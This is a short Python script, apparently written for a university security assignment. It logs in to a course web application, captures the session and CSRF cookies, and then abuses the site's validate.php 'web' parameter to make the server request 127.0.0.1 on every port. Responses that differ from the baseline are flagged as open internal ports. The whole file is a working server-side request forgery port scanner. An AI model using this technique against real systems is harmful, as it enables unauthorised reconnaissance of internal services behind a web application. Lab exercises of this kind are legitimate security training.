import requests
import html
import time

j  = 1 # counter to limit requests - 30 Reqs per mins~
print("Please enter a valid  user and pass to login, http://assignment-code-warriors.unimelb.life/")

username = input('Enter a username:')
password = input('Enter a pass:')

payload = {
    'user': username,
    'pass': password
}

# make request to login and get cookies  -  csrf
POST_LOGIN_URL = 'http://assignment-code-warriors.unimelb.life/auth.php'
s = requests.Session()
r = s.post(POST_LOGIN_URL, data=payload)
print("\nCSRF COOKIE: ", s.cookies['CSRF_token'])
print("PHPSESSID: ",s.cookies['PHPSESSID'])


print("_______Wait for Results________")


for i in range(1,65535):
    url = 'http://assignment-code-warriors.unimelb.life/validate.php?web=http://127.0.0.1:'+str(i)
    cookies = {'PHPSESSID': s.cookies['PHPSESSID'], 'CSRF_token' : s.cookies['CSRF_token']}
    r = requests.get(url, cookies=cookies)
    res = r.content
    decodeRes= html.unescape(res.decode('UTF-8'))

    if(str(r.headers["Content-Length"])!='30' or str(r.status_code)!='200'):
        print("Anomaly on port: ", i)

    j = j+1
    if(j==30):
        j = 0
        time.sleep(45)